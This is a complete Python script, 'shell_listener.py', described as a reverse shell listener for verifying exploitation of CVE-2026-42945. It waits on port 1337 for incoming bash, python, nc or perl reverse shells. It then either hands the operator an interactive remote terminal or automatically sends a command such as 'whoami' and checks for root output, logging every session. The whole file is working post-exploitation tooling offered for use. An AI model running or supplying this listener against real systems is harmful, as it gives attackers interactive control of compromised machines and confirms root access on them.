#!/usr/bin/env python3
"""
shell_listener.py — Multi-protocol reverse shell listener for CVE-2026-42945

Usage:
  # Basic interactive listener
  python3 shell_listener.py --port 1337

  # Automated verification (capture one command, then exit)
  python3 shell_listener.py --port 1337 --verify --verify-cmd "whoami" \
      --expect-output "root"

  # With connection logging
  python3 shell_listener.py --port 1337 --log-file ./sessions.log

Supports:
  - Raw TCP reverse shells (bash, python, nc, perl)
  - Encrypted/meterpreter shells (placeholder)
  - Command capture and verification
  - Session logging with timestamps
  - Timeout enforcement
"""

import argparse
import logging
import os
import socket
import select
import signal
import sys
import termios
import threading
import time
import tty


SESSION_ID = 0


def setup_logger(log_file=None):
    logger = logging.getLogger("shell_listener")
    logger.setLevel(logging.DEBUG)
    fmt = logging.Formatter(
        "[%(asctime)s] %(levelname)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )
    ch = logging.StreamHandler()
    ch.setFormatter(fmt)
    logger.addHandler(ch)
    if log_file:
        fh = logging.FileHandler(log_file)
        fh.setFormatter(fmt)
        logger.addHandler(fh)
    return logger


def handle_interactive(client, addr, logger):
    """Handle an interactive reverse shell session."""
    global SESSION_ID
    SESSION_ID += 1
    sid = SESSION_ID
    logger.info(f"Session {sid} established from {addr[0]}:{addr[1]}")

    oldt = None
    try:
        fd = sys.stdin.fileno()
        if os.isatty(fd):
            oldt = termios.tcgetattr(fd)
            tty.setraw(fd)
            sys.stdout.write(f"\n[+] Shell connected from {addr[0]}:{addr[1]}\n")
            sys.stdout.write("[+] Interactive session active. Ctrl+D to detach.\n")
            sys.stdout.flush()

        client.setblocking(False)
        stdin_buf = b""

        while True:
            rlist, _, _ = select.select([sys.stdin, client], [], [], 0.1)
            for r in rlist:
                if r == sys.stdin:
                    data = os.read(fd, 1024)
                    if not data:
                        logger.info(f"Session {sid}: stdin closed, detaching")
                        return
                    client.sendall(data)
                elif r == client:
                    try:
                        data = client.recv(4096)
                        if not data:
                            logger.info(f"Session {sid}: client disconnected")
                            return
                        os.write(fd, data)
                    except (ConnectionResetError, BrokenPipeError, OSError):
                        logger.info(f"Session {sid}: connection lost")
                        return
    except KeyboardInterrupt:
        logger.info(f"Session {sid}: interrupted by user")
    finally:
        if oldt and os.isatty(fd):
            termios.tcsetattr(fd, termios.TCSADRAIN, oldt)
        try:
            client.close()
        except Exception:
            pass
        logger.info(f"Session {sid} closed")


def handle_verify(client, addr, logger, verify_cmd, expect_output, timeout):
    """Handle a verification session: send command, capture output, check."""
    global SESSION_ID
    SESSION_ID += 1
    sid = SESSION_ID
    logger.info(f"Verify session {sid} from {addr[0]}:{addr[1]}")

    buf = b""
    client.settimeout(timeout)
    try:
        time.sleep(1)
        buf += client.recv(4096)

        logger.debug(f"Session {sid}: initial banner ({len(buf)} bytes)")

        cmd_bytes = (verify_cmd + "\n").encode()
        client.sendall(cmd_bytes)
        logger.debug(f"Session {sid}: sent command: {verify_cmd}")

        time.sleep(0.5)
        while True:
            try:
                chunk = client.recv(4096)
                if not chunk:
                    break
                buf += chunk
            except socket.timeout:
                break

        output = buf.decode("utf-8", errors="replace").strip()
        logger.info(f"Session {sid}: received output ({len(output)} chars)")
        logger.debug(f"Session {sid}: output:\n{output}")

        if expect_output:
            if expect_output in output:
                logger.info(f"Session {sid}: VERIFIED — expected output found")
                return True, output
            else:
                logger.warning(f"Session {sid}: expected '{expect_output}' "
                               f"not found in output")
                return False, output
        return True, output

    except socket.timeout:
        logger.warning(f"Session {sid}: timeout after {timeout}s")
        return False, buf.decode("utf-8", errors="replace")
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        logger.error(f"Session {sid}: connection error: {e}")
        return False, str(e)
    finally:
        try:
            client.close()
        except Exception:
            pass


def start_listener(host, port, logger, interactive=True,
                   verify=False, verify_cmd="id", expect_output=None,
                   verify_timeout=10, max_connections=0):
    """Start the reverse shell listener."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((host, port))
    except OSError as e:
        logger.error(f"Failed to bind {host}:{port}: {e}")
        sys.exit(1)
    srv.listen(5)
    srv.settimeout(1)

    conn_count = 0
    results = []

    logger.info(f"Listener started on {host}:{port}")
    logger.info(f"Mode: {'interactive' if interactive else 'verify'}")
    if verify:
        logger.info(f"Verify cmd: '{verify_cmd}', expect: '{expect_output}'")
    if max_connections > 0:
        logger.info(f"Max connections: {max_connections}")
    logger.info("Waiting for reverse shell...")

    while True:
        try:
            client, addr = srv.accept()
            conn_count += 1
            logger.info(f"Connection #{conn_count} from {addr[0]}:{addr[1]}")

            if verify:
                ok, output = handle_verify(
                    client, addr, logger, verify_cmd, expect_output, verify_timeout
                )
                results.append((ok, output, addr))
                if max_connections > 0 and conn_count >= max_connections:
                    break
            else:
                t = threading.Thread(
                    target=handle_interactive,
                    args=(client, addr, logger),
                    daemon=True
                )
                t.start()

        except socket.timeout:
            if not interactive:
                if max_connections > 0 and conn_count >= max_connections:
                    break
            continue
        except KeyboardInterrupt:
            logger.info("Shutting down listener")
            break

    srv.close()
    logger.info(f"Listener stopped. Total connections: {conn_count}")
    return results


def main():
    parser = argparse.ArgumentParser(
        description="Reverse shell listener for CVE-2026-42945 verification"
    )
    parser.add_argument("--host", default="0.0.0.0",
                        help="Bind address (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=1337,
                        help="Listen port (default: 1337)")
    parser.add_argument("--log-file", help="Log file path")

    mode = parser.add_argument_group("mode")
    mode.add_argument("--interactive", action="store_true", default=True,
                      help="Interactive shell mode (default)")
    mode.add_argument("--verify", action="store_true",
                      help="Verification mode: run command and check output")
    mode.add_argument("--verify-cmd", default="id",
                      help="Command to run for verification")
    mode.add_argument("--expect-output", default=None,
                      help="Expected string in command output")
    mode.add_argument("--verify-timeout", type=int, default=10,
                      help="Timeout per verification connection (seconds)")
    mode.add_argument("--max-connections", type=int, default=0,
                      help="Stop after N connections in verify mode")

    args = parser.parse_args()

    logger = setup_logger(args.log_file)

    if not args.verify:
        logger.info("Starting interactive listener (Ctrl+C to stop)")
    else:
        logger.info("Starting verification listener")

    results = start_listener(
        host=args.host,
        port=args.port,
        logger=logger,
        interactive=args.interactive and not args.verify,
        verify=args.verify,
        verify_cmd=args.verify_cmd,
        expect_output=args.expect_output,
        verify_timeout=args.verify_timeout,
        max_connections=args.max_connections,
    )

    if args.verify and results:
        passed = sum(1 for ok, _, _ in results if ok)
        failed = len(results) - passed
        print(f"\n{'='*60}")
        print(f"Verification Results: {passed} passed, {failed} failed")
        for i, (ok, output, addr) in enumerate(results, 1):
            status = "PASS" if ok else "FAIL"
            print(f"  #{i} [{status}] {addr[0]}:{addr[1]}")
            if not ok:
                print(f"       Output: {output[:200]}")
        return 0 if failed == 0 else 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
